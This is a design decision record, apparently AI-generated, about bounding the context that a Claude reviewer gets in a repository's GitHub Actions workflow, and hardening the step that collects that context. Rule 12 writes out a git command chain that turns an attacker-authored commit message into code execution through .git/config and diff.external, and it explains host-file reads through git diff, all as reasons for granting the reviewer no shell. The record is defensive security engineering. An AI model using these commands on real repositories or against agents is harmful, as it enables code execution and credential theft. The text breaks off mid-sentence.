---
type: Decision
title: Bound Claude review context by selecting agent mode instead of tag-mode history assembly
description: Replace the mention workflow's unbounded tag-mode context assembly with an agent-mode prompt whose every interpolated source is independent of discussion length, and record the loss of on-Pull-Request delivery as an explicit trade.
status: draft
generated:
  by: anthropic/claude-opus-5
  at: "2026-09-27T11:00:00Z"
sources:
  - id: work-item
    resource: https://github.com/ktogias/gnostoa/issues/326
    title: Bound Claude review context so invocation does not fail on large Pull Requests
  - id: owning-objective
    resource: https://github.com/ktogias/gnostoa/issues/15
    title: Automate deterministic knowledge-workflow mechanics without weakening assurance
  - id: hardening-decision
    resource: ./0093-harden-claude-code-github-actions-workflows.md
    title: Harden the Claude Code GitHub Actions workflows
  - id: observed-failure
    resource: https://github.com/ktogias/gnostoa/pull/319#issuecomment-5854764807
    title: Measured tag-mode context exhaustion on PR 319
  - id: mode-detector
    resource: https://github.com/anthropics/claude-code-action/blob/9171db3e57d6a3140a37ddc2ba92788584e0ead6/src/modes/detector.ts
    title: Pinned action mode detection
  - id: agent-mode
    resource: https://github.com/anthropics/claude-code-action/blob/9171db3e57d6a3140a37ddc2ba92788584e0ead6/src/modes/agent/index.ts
    title: Pinned action agent mode prompt assembly
  - id: data-fetcher
    resource: https://github.com/anthropics/claude-code-action/blob/9171db3e57d6a3140a37ddc2ba92788584e0ead6/src/github/data/fetcher.ts
    title: Pinned action tag-mode GitHub data fetcher
x-project-knowledge:
  id: kit.decision.0094.bound-claude-review-context
  owners:
    - team:gnostoa-maintainers
  scope:
    - gnostoa
  relations:
    - kind: references
      target: /decisions/0093-harden-claude-code-github-actions-workflows.md
    - kind: supersedes
      target: /decisions/0093-harden-claude-code-github-actions-workflows.md
    - kind: governed-by
      target: /decisions/0018-adopt-evidence-gated-capability-evolution-for-gnostoa-self-governance.md
    - kind: governed-by
      target: /decisions/0062-require-proportionate-prior-art-and-reuse-review.md
    - kind: verified-by
      target: /decisions/0093-harden-claude-code-github-actions-workflows.md
---

# Bound Claude review context by selecting agent mode instead of tag-mode history assembly

## Context

Decision 0093 hardened the owner-installed Claude workflows. It did not bound the
context those workflows assemble, because at installation time the reviewed Pull
Requests were small.

In the pinned action, `src/github/data/fetcher.ts` retrieves issue comments,
reviews, review comments and the changed-file list for tag mode with **no cap on
comment or review count**. The assembled prompt therefore grows with the
discussion rather than with the change.

Measured on PR #319 — same workflow, same pinned action, same model:

| | 2026-09-26 20:43 | 2026-09-27 08:23 |
|---|---|---|
| `FINAL PROMPT` | 1,418 lines / 163,864 B | 5,858 lines / 446,488 B |
| `is_error` | false | true |
| `total_cost_usd` | $4.24 | $0 |
| `num_turns` | 6 | 1 |
| `duration_ms` | 119,273 | 647 |

Zero cost with an empty `modelUsage` means the model was never called: the
rejection happens before dispatch. Four consecutive invocations failed this way.
PR #319 carries 676 comments and 1,099,660 bytes of discussion, of which the
accountable owner authored 70%, so `exclude_comments_by_actor` over the reviewer
bots removes roughly 30% and cannot approach the size that worked.

## Prior-art and reuse disposition

Reuse Decision 0093 as the authority for pins, credential-free checkouts, token
scope, trigger gating and bounded execution, with
`tests/test_claude_actions_workflows.py` as its enforcement. Seven of its eight
rules are carried unchanged. **Rule 8's tool clause is partly superseded here**
-- see the supersession section below -- and no other rule is touched.

Two alternatives were measured or read before choosing:

- **`exclude_comments_by_actor` / `include_comments_by_actor`.** The only
  context-reducing inputs the pinned action offers. Rejected as insufficient on
  the measured distribution, and an allowlist that drops owner comments would
  remove exactly the dispositions a reviewer needs.
- **A rolling summarisation digest of the discussion.** Rejected as a second
  artifact that must be maintained and can drift. The repository has already
  observed that failure mode: a transcribed test count in an assessment was
  reported stale four times while the subject moved from 103 to 120.

No new dependency, service or runtime is introduced.

## Decision
1. The mention workflow supplies a `prompt` input. Per
   `src/modes/detector.ts`, supplying `prompt` selects **agent mode** even on
   comment events; per `src/modes/agent/index.ts` agent mode builds the prompt as
   the supplied text alone and fetches no GitHub data. Bounded context is
   therefore obtained by mode selection, not by summarisation.
2. Every interpolated source in that prompt must be independent of discussion
   length. The admitted set is the repository identity, the issue or Pull Request
   number, head and base SHAs, the issue or Pull Request body, the triggering
   comment body, the triggering review body, the issue title and the Pull Request title, the issue and Pull Request author associations, the reviewed head repository name, the
   Pull-Request-backed presence flag on an issue payload and the triggering review
   comment's path, line, diff hunk, original commit id and original line, and
   the resolved pull number the guard step reports. Item type is keyed on that
   number rather than on head/base equality, which a merged or empty Pull
   Request can satisfy while still being a Pull Request. Each is one bounded field; none
   scales with the number of comments. Any expression outside that set fails the
   contract test.
3. The static prompt is bounded at 4096 bytes. Total context is then the prompt
   plus one comment body plus one Pull Request description, none of which scales
   with the number of comments.

   **What that bound is, precisely.** It removes the dependence on discussion length,
   which is what failed: the reviewer no longer reads more as a Pull Request
   accumulates comments. It does **not** cap the interpolated bodies themselves. A
   GitHub Actions expression cannot truncate a value, so each body arrives at whatever
   length the provider allows for one body -- far larger than the prompt bound, though
   a small multiple of it rather than the unbounded accumulation this Decision exists
   to remove. Calling the total "bounded" without saying which bound was meant
   overstated it, and this rule now says which.
4. The prompt must forward the triggering request. Agent mode ignores the comment
   body unless the template interpolates it, so an unforwarded mention would
   review nothing while appearing to succeed.

   *Since Decision 0096 this holds through the relay:* admission writes the request as `request/request`, and the prompt sends the reviewer there first.

5. Context is obtained by **retrieval rather than pre-loading**. The prompt names
   what to review and where to look; the reviewer uses its own tools to read the
   diff and the files it needs. Nothing is lossily pre-summarised.
6. The Pull Request description is the one curated state input. On Gnostoa-self
   candidates it is already an agent-maintained current-state projection, so it
   carries dispositions without carrying the transcript.
7. Because the reviewer no longer receives the discussion, the prompt instructs it
   to raise a possibly-settled point as a question rather than as an assertion.
8. The checkout must bind an explicitly **resolved** commit, and that commit is
   `github.workflow_sha` -- the protected default-branch revision this run was bound
   to (see rule 21). It is **not** the Pull Request's base: for a candidate targeting
   another branch, or one whose base predates this workflow revision, the two are
   different commits and the checked-out bytes can be unrelated to the change. Saying
   "the base" here would have a maintainer reading this rule treat them as the same.
   Agent mode performs no Pull Request resolution, so a default checkout on a comment
   event lands wherever `github.ref` points -- the default branch, or on the review
   triggers the candidate's merge ref. The reviewed
   head is still resolved, in order, from a submitted review's `review.commit_id`
   when the event carries one (rule 18), else the event's own Pull Request head SHA,
   else the head reported by a token-side lookup of the resolved pull number, else
   the triggering ref; it identifies the **comparison** the context step asks for,
   not a tree to check out.
9. **The mention job must never check out a fork-controlled head.** Binding the
   checkout to a Pull Request head places contributor-controlled code in the job
   that holds the Claude credential. The author-association gate does not close
   this: it constrains who comments, not whose code runs. The head is therefore
   resolved with the read-only token in a step that fails closed when the head
   repository differs from this repository, before any candidate byte is checked
   out, reaching the same boundary Decision 0093 rule 5 sets for the automatic
   review.

   *Since Decision 0096 this holds through the relay:* admission refuses a fork-controlled head from the provider's answer.

10. The reviewer diffs against the **resolved base**, not a fixed branch, and the
   prompt names the repository's declared entry route -- `README.md` first, as
   `AGENTS.md` itself states.
   The **title** is read from whichever payload carries it. `pull_request_review` and
   `pull_request_review_comment` carry `github.event.pull_request` and no
   `github.event.issue`, so a title expression reading only the issue rendered empty on
   two of the four admitted paths -- and the title is the change's stated purpose in one
   line, which a reviewer with no discussion cannot recover elsewhere. The trust gate of
   rule 15 applies to whichever payload supplies it.

11. The prompt must cover every admitted trigger payload. `issue_comment` carries
   `github.event.issue.*`, the review triggers carry `github.event.pull_request.*`,
   and `issues: opened` may hold the mention in the title alone. A template that
   reads only one shape silently loses the others.

    *Since Decision 0096 this holds through the relay for the two events it still admits,* issue comments and opened issues, each re-read by admission. *The two review events are withdrawn* (Decision 0096 rule 13), so this rule no longer covers them.

12. **The reviewer gets no shell, and retrieval happens in a trusted step.** The
   pinned action disables Bash by default, so a retrieval-based prompt would
   otherwise leave the reviewer with a checkout it cannot inspect. Two successive
   attempts to grant a safe git were both wrong, and the second failure is the
   instructive one.

   A verb-prefix grant is not read-only:
   `git log --output=.git/config --format=%B -1 <sha>` writes an attacker-authored
   commit message into repository config and a following
   `git diff --ext-diff <base> <head>` executes the `diff.external` it configured.
   Replacing the prefix with a wrapper that validated its arguments then still
   read arbitrary host files, because `git diff <pathA> <pathB>` implies
   `--no-index` when a path lies outside the working tree. Both were reproduced.

   The second fix was patched rather than replaced, and that was the error. A
   `Bash(<program>:*)` grant is a grant of **a shell**: redirection, pipes and
   substitution remain available no matter what the invoked program validates, so
   an argument allowlist is the wrong kind of control for this hazard and each
   patch only moved the boundary. **No Bash of any shape is granted.** A trusted
   step performs the retrieval itself with fixed arguments and no
   candidate-controlled input, writing `diff.stat`, `commits.log` and a
   size-bounded `diff.patch` into `.gnostoa-review-context/`, which the reviewer
   opens with `Read` and `Grep`. The comparison is asked of the provider for the two
   resolved revisions rather than computed from a local candidate tree, which is what
   lets rule 21 hold. Two properties of that source are recorded because they were
   found by exercising it rather than by reading about it: a file's status is written
   as the full word, since `removed` and `renamed` share a first letter and a reviewer
   must be able to tell a deletion from a rename; and the provider's two collection
   limits differ, so they are handled differently. Commits are paginated at 250 per
   page, so every page is requested, and `commits.log` still states how many of how
   many when the reported total exceeds the listed count. The changed-file list is
   capped at 300 and is **not** paginable, so `diff.stat` carries an explicit notice
   once it reaches that cap rather than letting a capped summary read as the whole
   change. A missing per-file patch is a **neutral fact, not a file type**. It occurs for a
   binary or oversized blob, whose bytes are in neither the diff nor the checkout, and
   equally for a metadata-only change -- a mode bit, an empty file, a pure rename --
   which is a different thing entirely. Calling every such entry binary made the
   prompt require a real change to be reported as not examined, and dropped it from
   the assembled fallback entirely. The first correction said such a change is
   reviewable from its *status*, and the paragraph below retires that: status cannot
   distinguish a mode-only change from a binary content change. What can be reviewed
   is *which* metadata changed, and that is carried by a real unified diff's mode
   lines and by nothing else here -- so when `patches-source` is present the diff was
   assembled per file, those lines are absent, and such an entry is not examined
   either. The condition travels with the claim wherever it is made. The artefact is therefore `no-patch.txt`, and the fallback
   keeps a header for every changed file whether or not it carried hunks.

   `status` cannot distinguish the two cases -- a mode-only change and a binary content
   change both arrive as `modified` with no hunks -- so leaving the reviewer to infer it
   from the status was itself a false claim. The **blob identity** does distinguish
   them, and the directory listing already carries it: an identical blob means a
   metadata-only change, while a differing blob means content changed that no artefact
   here can show. `base.manifest` records which, and the prompt requires the reviewer to
   report a `content-changed-without-hunks` entry as not examined.

   **No redirect is followed.** `urlopen` follows redirects, and the stdlib's handler
   drops only `content-length` and `content-type` when it builds the next request -- so
   the `Authorization` header travels to wherever the redirect points, including
   another origin or plain HTTP. Validating the endpoint at the point of use never saw
   that target. Every request goes through a handler that refuses the redirect instead,
   so the pinned-origin contract covers the whole exchange rather than only its first
   hop. This rule first re-checked the target against the pinned *pattern*, which was
   not enough and is recorded with its replacement further down; the pattern admits
   another owner, repository, revision and file.

   **The budget reaches the request path.** Checking the clock only between files
   bounds nothing: three attempts, each with its own timeout and a rate-limit sleep,
   can run well past the deadline while collecting a single file. The deadline is
   carried into every request, checked before each attempt, and no sleep is allowed to
   overshoot it -- a number the collection states is only a number it keeps if it
   reaches where the time is actually spent.

   **The collection holds a wall-clock budget.** Up to 300 changed files, each with a
   listing and a contents request, each retried: the worst case ran past the job's own
   timeout, and a job the runner kills produces no review at all -- so the retry added
   above could, on a large Pull Request, cause exactly the outcome it prevents on a
   small one. Entries not reached before the deadline are named `deadline-reached`. The
   staging name is a short digest rather than the file's own basename for a related
   reason: copying a basename near Linux's 255-byte `NAME_MAX` and adding punctuation,
   randomness and `.partial` overflows it, and the file would be lost to the mechanism
   meant to protect it.

   **A malformed body is not a path problem.** `json.loads` raises `JSONDecodeError`,
   which is a `ValueError`, and the per-file handler records an unusable *pathname* by
   catching `ValueError` -- so a truncated response was filed as though the candidate
   had an unusable filename. Reporting a wrong cause is worse than reporting a missing
   file, which is the principle the whole manifest rests on. Such a body is retried and,
   if it persists, recorded as `provider-error`, raised as a type the pathname handler
   cannot absorb. A **rate limit** is likewise retried rather than refused: GitHub
   reports an exhausted primary limit as 403, so treating every 403 as permanent aborted
   the review on the failure most likely to occur when a Pull Request is large, while a
   genuine authorisation failure still stops at once.

   **A rate limit is waited out on the provider's terms, not ours.** A fixed backoff
   can spend every attempt inside the window GitHub explicitly told us to wait out,
   after which the error escapes and the whole review is lost -- a retry that is
   indistinguishable from not retrying. `Retry-After` and `X-RateLimit-Reset` say when
   the next request is permitted and are honoured, bounded by what a job with its own
   deadline can afford to sit through. `Retry-After` is read in both forms HTTP allows,
   delay-seconds and an HTTP-date; reading only the first sent a date to the fallback
   wait (CodeAnt, #330). A number in either header is read only as bounded ASCII
   digits. `isdigit()` alone accepted a latin-1 `\xb2`, and an over-long reset
   exceeded Python's integer-string limit. Both raised a `ValueError` that was recorded
   as `unsupported-path`, a provider header misfiled as a path problem; a malformed
   hint is now no hint (CodeRabbit, #330). The contract test checks the pause the headers
   imply **and** that the retry actually sleeps for it: an earlier version computed the
   right pause and ignored it, which the function's own test could not see.

   Only a rate limit consults those headers. GitHub sends `X-RateLimit-*` on ordinary
   responses as well, and the reset is usually minutes away, so reading them for a
   plain 5xx made a transient blip wait the cap -- roughly two minutes per request
   against a ten-minute budget, turning the retry into the thing that reaches the
   deadline. And a refused redirect is **not retried at all**: it cannot become allowed
   by trying again, it is not a malformed body, and sharing a branch with the decode
   errors spent two sleeps on it before recording `malformed provider body` -- the
   wrong cause, which this collection treats as worse than a gap. It carries its own
   type and its own manifest label.

   **A failure that already named its cause keeps it.** The refused redirect was
   removed from the decode branch, but the branch still overwrote the message of every
   `ProviderError` it caught on the last attempt. A read that outlasts the whole-request
   bound is raised as a `ProviderError` too, and it is genuinely transient, so it is
   right for that branch to retry it -- but on exhaustion a slow provider was recorded
   as `malformed provider body`, telling the reviewer that bytes were corrupt when the
   collection knew only that they were late. The branch now re-raises a `ProviderError`
   unchanged and wraps only a raw decode error, so the two failures the collection can
   tell apart stay apart in the manifest. Both halves are tested, and the wrapping half
   is exercised through a raw `JSONDecodeError` and `UnicodeDecodeError` because
   `fetch_json` converts them at the read: without that the line has no coverage, and
   a test driving only the transport would pass whether the branch labelled anything or
   simply re-raised.

   **The stated request bound is one the request cannot exceed.** The socket timeout
   bounds one receive and the check between chunks bounds their sum, and neither bounds
   the request: the timeout is set once, at `open()`, so a chunk arriving just before
   the absolute stop is followed by a receive given a *fresh* full socket timeout. A
   nominal 30-second request could run for nearly 60 and overrun a collection deadline
   computed from the number it states. Half the budget goes to the stop and half to the
   single receive that may straddle it, and the stop is checked before each receive as
   well as after it, so a request whose budget is already spent is not granted one
   more. `read1` bounded each receive; it did not bound their sum, and the comment
   claiming an absolute bound was ahead of the code.

   That arithmetic bounds the body read and nothing else, and the first version of this
   rule claimed more than that. Connecting, the handshake and the status line and
   headers all happen inside `open()`, where no check of this collection's can reach.
   CPython reads headers as up to `_MAXHEADERS + 1` lines of `_MAXLINE` bytes, each
   byte able to arrive in its own receive bounded only by the socket timeout -- roughly
   six million receives before the limit is structural. A provider dripping header
   bytes therefore keeps `open()` alive past every deadline stated here, the
   between-files deadline check is never reached, and the step hits its job timeout
   having written no manifest at all -- the exact outcome this Decision exists to
   remove. **So the request runs on a daemon thread the caller stops waiting for.**
   The abandoned thread keeps its socket until its receive ends or the process does.
   The deadline bounded how many could accumulate only through the time each cost:
   about 20 request workers, and up to about 120 if every error body stalled its
   5-second read. A first estimate here said "tens" and missed the second kind
   (CodeAnt, #330). So the cap is explicit: at most `MAX_ABANDONED` (16) may be running,
   and past that a request fails at once as a provider error. Whoever revisits this
   should note that no arithmetic inside
   the read loop can bound the phase before it: the caller has to be the one that
   stops.

   **An identity is a well-formed identity, not a non-empty string.** Hunkless changes
   are classified by comparing the comparison's blob id with the listing's, which
   accepted any truthy value. Two equal *malformed* ids -- a truncated pair is the
   obvious way to get them -- therefore read as `metadata-only`, while the `base/`
   guard, which computes the real blob id, recorded `blob-mismatch` for the same path:
   a manifest saying both that the content was unchanged and that its identity did not
   check out. `SHA_PATTERN` is this module's own definition of a blob identity and is applied
   to both classification fields and to the `base/` guard. An entry without two
   well-formed ids is listed as `unclassified-without-blob-identity` rather than
   classified, and the prompt says so, because the manifest may not assert a
   classification it did not establish. A malformed id is also recorded as
   `blob-unverifiable` rather than `blob-mismatch`: there was no identity for the bytes
   to disagree with, and naming the wrong cause is the thing the rule above forbids.

   **A failure to look is not absence.** A directory listing that is syntactically
   valid JSON of the wrong shape -- `{}` -- made `listing_entry` return None, and the
   fallback recorded `absent-at-merge-base`. That attributed a provider failure to the
   repository and skipped bytes that were there to be fetched, which is the false
   base-state claim this collector exists to avoid. A non-list listing is a
   `provider-error`. This rule first kept absence for a 404; that exception did not
   survive either, for reasons recorded with the rest of the absence contract further
   down, and the label no longer exists.

   That check tests `listing is not None` first, and the first version of it left the
   hole it was written to close. `json.loads` returns the same `None` for a body of
   `null` as this path uses for a 404, so a 200 carrying `null` reached the caller
   indistinguishable from absence and the shape check never saw it. `None` now means a
   404 and nothing else: a null body is a `provider-error` raised at the decode. The
   general rule is that a sentinel a caller reads as *absence* must not be a value the
   wire can produce.

   The same rule reaches one place further. A 404 on the *contents* request is not
   absence either, once the directory listing at the same merge base has already said
   the file is there. The merge base is an immutable revision, so the two requests are
   about the same tree, and a 404 across them is the provider contradicting itself.
   Recording it as `absent-at-merge-base` turned an inconsistency into repository-state
   provenance the reviewer has no way to question, while skipping bytes that exist. It
   is a `provider-error` naming both halves of the contradiction.

   Following that argument back one step removes the label entirely. Every entry that
   reaches the listing lookup is non-added -- `added` returns earlier with
   `added-by-candidate` -- so the **comparison** has already placed that source at this
   same merge base. A directory 404, or a listing that does not hold the name,
   contradicts the comparison exactly as a post-listing contents 404 contradicts the
   listing. `absent-at-merge-base` therefore had no true use left and no longer appears
   in the collector. `listing-at-cap` stays, renamed from `listing-truncated`: a listing
   that *reached* the provider's maximum establishes neither truncation nor a
   contradiction -- the name may lie beyond it, or the listing may be complete -- so
   the label records only what was observed, as the changed-file cap now does too.

   Two tests asserted the removed label, one of them written in this Decision's own
   work as a *control* for the rule above it: it took a directory-listing 404 as
   evidence about the repository rather than about the request. It is not, and the
   control passed. The claim is paraphrased rather than quoted here, because a
   contract test now refuses that conjunction anywhere in this document -- a rule
   written out still reads as a rule to someone scanning for one. Absence from the base
   is **established** only by the comparison itself -- an `added` status -- and is never
   inferred from a failure to look: a listing or contents failure is a
   `provider-error`, a statement about the request (CodeRabbit, #330).

   **No redirect is followed.** The guard matched the pinned endpoint *shape*: scheme,
   host, and a `/repos/<owner>/<repo>/contents/...?ref=<40 hex>` path. Another owner,
   another repository, another revision and another file all satisfy that, and the
   `Authorization` header travels with the request while the bytes are written into
   `base/` as this repository's pre-change state. The blob-identity check does not
   close it, because a *listing* request can be redirected the same way and then both
   halves come from the wrong place and agree with each other. A redirect that is safe
   here would have to be the same repository, the same revision and the same path --
   with scheme and host already pinned, that is the same URL -- so there is nothing a
   redirect can legitimately change and no way to verify one that does. A renamed or
   transferred repository is refused too, and recorded as `unsafe-redirect`: a gap the
   reviewer can see, which this collector prefers to bytes whose origin it cannot
   state. The test that asserted "a redirect that stays within the pinned shape is
   still followed" made the weakness look intended; it now asserts the refusal.

   **A retired contract stops reading as a live one.** Both rules above were fixed by
   appending the new contract and leaving the old one in place, several hundred lines
   earlier: this Decision then stated, in the present tense, both that redirects are
   re-checked against the pinned pattern and that only non-matching ones are refused,
   and that a directory-listing 404 still established absence. The document is
   normative and is
   read top-down, so the superseded rule is the one a maintainer meets first, and
   restoring either reintroduces exactly what the later paragraph removed -- one of
   them the credential-leaking redirect. Each earlier paragraph now states the current
   invariant and points forward for the reasoning. A contract test refuses the two
   retired phrasings and requires the two current ones, and a second pins the manifest
   label vocabulary the collector emits, because `absent-at-merge-base` outlived its
   removal here by one commit.

   **A copy is counted as a copy.** The mapping list holds renames and copies
   together, and the summary reported its length as `Renamed:`. A comparison with one
   copy and no rename announced `Renamed: 1` in the line the reviewer is told to
   trust, while the mapping underneath said `copied` -- a file duplicated, reported as
   a file moved, with the original still in place. The counts are separate and the
   preamble names both.

   **A response is bounded in size as well as in time.** The read loop bounded how
   long a response may take and not how large it may be, so a provider answering with
   an endless body filled the runner's memory while every deadline was still in the
   future; the collection's own byte budget -- 512 KiB for all of `base/` -- is
   checked after the decode, far too late. A body over `MAX_RESPONSE_BYTES` is
   refused, checked on every chunk, so what is held is bounded by the cap plus one
   chunk rather than by the provider's willingness to stop. The cap sits an order of
   magnitude above both legitimate shapes: a listing of at most `LISTING_CAP`
   entries, and a contents response carrying base64 of a file whose payload cannot
   usefully exceed that whole budget. A bound that refuses a legitimate answer is a
   gap generator, so the test asserts the headroom as well as the refusal.

   Bounding each response does not bound their sum, which is the same mistake the read
   loop made with time. Directory listings were cached whole until the collection
   finished, so a change touching one file in each of many crowded directories retained
   every full response -- up to `FILE_CAP` of them, each able to approach the cap, and
   the per-response bound says nothing about that. A directory is consulted for two
   things: the records of the names the comparison places in it, and whether the
   provider capped the list. Only those are kept, and the original length is carried
   separately because the truncation notice depends on it and a reduced list can no
   longer report it -- without that, a capped directory would read as complete and "the
   name may be in the part we did not get" would become a false absence claim.
   Retention is bounded by the number of changed files rather than by the size of the
   directories they happen to live in -- and that has to cover **every** shape the cache
   holds, not the convenient one. The first version reduced only array-shaped responses,
   so a provider returning a large syntactically valid object for each directory filled
   the runner by the other route while each individual response respected the size cap.
   A response that is not an array is replaced by a payload-free stand-in that still
   classifies as a shape error. `None` passes through unchanged, because that is the
   not-found transport sentinel the rest of the collection reads.

   And a *record* is reduced to the fields it is read for -- `name`, `type`, `size`,
   `sha`. The contents API sends `_links`, `download_url`, `git_url`, `html_url` and
   `url` beside them, so keeping matched records whole retained all of that for every
   changed file. Three rounds of the same finding narrowed this from *which responses*
   to *which records* to *which fields* to *which values*, each one closing a route the
   previous fix left open. Selecting four fields still retained whatever the provider
   put in them, so a matching record carrying a megabyte-long `type` or `sha` reopened
   the same exhaustion a fourth time. Each field is normalised to the representation the
   code downstream uses: a type it can compare, a size it can subtract, an identity that
   matches `SHA_PATTERN`. Retention is worth stating as a property of its own, since stating it
   once would have replaced four rounds: **what is kept is the bounded set a later step
   consumes, never the provider's answer** -- and that applies to values, not only to
   which keys are copied.

   Testing that bound surfaced a separate wrong-cause defect. CPython refuses `int()`
   beyond `sys.get_int_max_str_digits()`, so `json.loads` raises a **plain ValueError**
   -- not a `JSONDecodeError` -- for a long enough integer literal. The decode guard
   named `JSONDecodeError` and `UnicodeDecodeError`, both members of `ValueError`, so
   that body escaped to the per-file handler and was filed as an unusable *pathname*: a
   malformed provider response reported as a problem with the candidate's filename. The
   guard names its base class now, and the reason is the count rather than the case.
   Naming `JSONDecodeError` missed a body that is not UTF-8; naming that pair missed the
   plain `ValueError`; naming `ValueError` missed `RecursionError`, which is a
   `RuntimeError` and arrives from input as ordinary as `[` repeated a hundred thousand
   times -- well under the size cap, and enough to end the collection with no manifest
   written. Four enumerations, four escapes.

   The only statement inside that guard is the decode, and every way it can fail means
   the same thing: the provider's answer is not usable. So it catches `Exception` and
   converts.

   **A test cannot argue for that.** The contract test carries five hostile bodies, and
   the narrower clause `(ValueError, RecursionError)` passes all five -- a mutation table
   confirms it. It could not be otherwise: a test can only contain the members someone
   already thought of, which is the same limit that produced the four escapes. The
   argument for the base class is the history, not the evidence, and the evidence is
   recorded here as not settling it.

   **The fallback diff is written per entry.** Every patch string was concatenated into
   one value before being written, which held the whole assembled diff a second time --
   the patches are already resident from parsing `comparison.json`, so the join
   duplicated the largest thing in memory. The test asserts the number of writes rather
   than a peak-memory figure, because the claim is about the shape of the work and a
   memory probe would be flaky.

   **What this does not bound.** `comparison.json` is read whole and parsed whole, so
   the patches are resident once however large the comparison is. That is the ceiling
   these three fixes sit under, it predates them, and no bound here changes it. Bounding
   it would mean either a streaming parse or refusing a comparison above some size --
   the second would turn a large Pull Request into a refused review, which is the
   failure this Decision exists to remove, so it is recorded rather than decided.

   That pre-pass then broke the guarantee the whole collection rests on. It resolves
   each entry's base-side path to learn which listing records to keep, and
   `base_path_of` refuses a renamed or copied entry that carries no `previous_filename`
   -- outside the per-file handler, so the `ValueError` escaped `collect` before any
   manifest was written and one malformed comparison entry cost the entire review. The
   pre-pass skips what it cannot resolve and leaves it to the handler, which records
   `unsupported-path` for that one file.

   Testing that guarantee found a **second** escape, older than the pre-pass: the
   assembled fallback diff resolves the same path for its header, also before the
   handler. Its header now says the base side is unresolved. `/dev/null` would assert
   the candidate added the file and an invented name would assert a base-side path the
   comparison never gave, so it says neither. The guarantee was already not held for
   this input; the new code made it reachable twice over, and one reviewer finding
   surfaced both.

   **And it did not cover the comparison at all.** Per-file isolation is about what
   happens inside the loop. A valid JSON document that is not an object, a file list
   that is not an array, an entry that is not an object, or an entry without a filename
   each reached an unguarded index or attribute and ended `collect` before any manifest
   existed -- measured, not inferred: `AttributeError`, `TypeError`, `KeyError`, and no
   `base.manifest` in any of the three. A review is lost either way; a manifest naming
   what could not be read is the difference between a reported gap and silence.

   The comparison is reduced once, at the top, to the entries the collection can act on,
   with a `provider-error comparison.json` notice for each it cannot -- so no later step
   guards the shape again. *Superseded by rule 35:* an entry was first admitted on its
   filename alone, with a missing status written as `unstated`. Every later step
   decides from the status, so an entry now needs a documented one; without it, the
   entry is named as a `provider-error` for its path and counted in `Unavailable:`.
   What the earlier choice guarded still holds: two sites in the summary writer
   indexed `status` and raised `KeyError` on a bare entry before any manifest existed,
   and every reader still reads with a default.

   The *parse* was still unguarded, which is the outermost escape and the last one:
   malformed JSON, a body that is not UTF-8, or a file that cannot be read at all raised
   out of `collect` before any manifest existed, so the step failed and the reviewer got
   nothing -- not even a statement of why. It is recorded and never raised, and the
   clause names the base class for the same reason the provider decode does: four
   enumerations in this file have each missed a member, and a mutation confirms that
   `json.JSONDecodeError` alone -- the plausible narrow choice -- still loses the
   non-UTF-8 case.

   **What `base/` holds was overstated in both records.** The module docstring and this
   Decision each stated it universally. It does not hold them all, and the collector's own vocabulary says so: `added-by-candidate`,
   `over-budget`, `not-a-plain-file`, `blob-unverifiable` and `blob-mismatch` each name
   a changed file whose bytes are not there. A reader who believes the universal takes
   an absent file for an absent *change*, which is the false provenance this collection
   exists to prevent -- asserted, as it happens, in the two places a maintainer checks
   first.

   The guard for it is deliberately a tripwire rather than a proof. It catches the
   universal quantifier, which is the form the claim took in both records and has few
   spellings; it cannot catch an over-claim phrased some other way. A broader rule was
   tried first -- every paragraph saying what `base/` holds must name an exception --
   and it was both too lenient, passing the offending paragraph because a marker
   appeared elsewhere in it, and too strict, flagging two paragraphs that were already
   correct. A guard that reports false findings is worse than none, so this one claims
   less and says so.

   And it was pointed at the wrong surface, which is how the same claim survived a
   third time. Correcting the module docstring and this Decision left the universal
   standing in `base.manifest`'s own preamble -- a string literal, so neither a comment
   nor a docstring, and invisible to a guard that reads prose. That artefact is the one
   the reviewer is handed, so the claim was fixed where it was least consequential and
   left where it was most: a manifest opening "the bytes of each changed file" above a
   body reporting `Written: 0` and `added-by-candidate`. The guard now renders a
   manifest and reads that too. Wherever a record and an artefact say the same thing,
   the artefact is the one worth checking first.

   Reducing the comparison then broke the cap notice, and broke it the same way the
   directory listing's truncation notice had been broken earlier in this same work.
   `diff.stat` warns when the provider's changed-file list hit its cap, and that count
   was taken from the list `write_summaries` receives -- which is now the *reduced* one.
   One unusable entry among a capped 300 left 299, the notice disappeared, and a
   truncated change read as complete. The delivered count travels with the reduced list,
   exactly as the listing's does.

   Worth stating as a rule rather than as two incidents: **a reduced collection cannot
   report what it was reduced from.** Every count taken from one has to be taken before
   the reduction or carried alongside it. This work has now got that wrong twice, in two
   functions, with the second introduced days after the first was fixed.

   **A secondary rate limit is recognised by its message too.** GitHub documents a
   secondary limit arriving as a 403 with neither `retry-after` nor
   `x-ratelimit-remaining: 0`, identified by its message alone. Classifying on headers
   only sent that response down the permanent-refusal path, and on a large Pull
   Request -- which is when secondary limits happen -- every later base lookup became
   a gap. A bounded prefix of the error body is read as well, following
   `ci/review_github_current_state.py`, which already classifies GitHub errors this
   way in this repository, rather than inventing a second convention. The prefix is
   bounded for the same reason the response is, and an unreadable body leaves the
   header answer standing rather than a guess.

   Recognising those responses then exposed the pause. A secondary limit can arrive with
   no timing header at all, and the no-hint path fell back to the ordinary transient
   backoff -- five seconds, then ten -- so all three attempts stayed inside the window
   the provider had just announced, and files that were retrievable were recorded as
   `provider-error`. GitHub documents waiting at least a minute in that case and warns
   that requests made during a secondary limit can extend it, which makes the short
   backoff worse than not retrying at all. A recognised limit with nothing to say when
   it lifts now waits `UNHINTED_RATE_LIMIT_WAIT`, still bounded by
   `MAX_RATE_LIMIT_WAIT` and by the collection deadline. The transient backoff belongs
   to the *unrecognised* case and stays there.

   Introducing that pause also broke a test that had neutralised timing by zeroing the
   transient constant alone: the suite went from six seconds to sixty-six, because one
   case then slept a real minute. Worth stating as a hazard rather than a one-off --
   every timing-neutralising test is stale the moment a new pause source is added, and
   the suite's own duration was the only thing that reported it.

   That read then needed three corrections of its own, each an invariant already
   stated elsewhere in this Decision that the new code did not inherit.

   It ran on the caller's thread, so it was bounded in size and not in time.
   `error.read(n)` keeps receiving until it has `n` bytes -- which is why the response
   loop uses `read1` -- so a body arriving one byte before each socket timeout held the
   collection for up to `ERROR_DETAIL_BYTES` receives, past the request bound and the
   deadline alike. It runs through the abandoning helper, with **whatever is left of
   the deadline** and never more than `ERROR_DETAIL_SECONDS`, and not at all when the
   budget is gone: a per-error cap alone bounds the read without honouring the number
   this Decision claims reaches the request path.

   The read is destructive, and classification runs **twice** for one error -- once in
   the retry condition and again inside `rate_limit_pause`. The first call consumed the
   body and the second answered "not a rate limit", so the retry used the fixed backoff
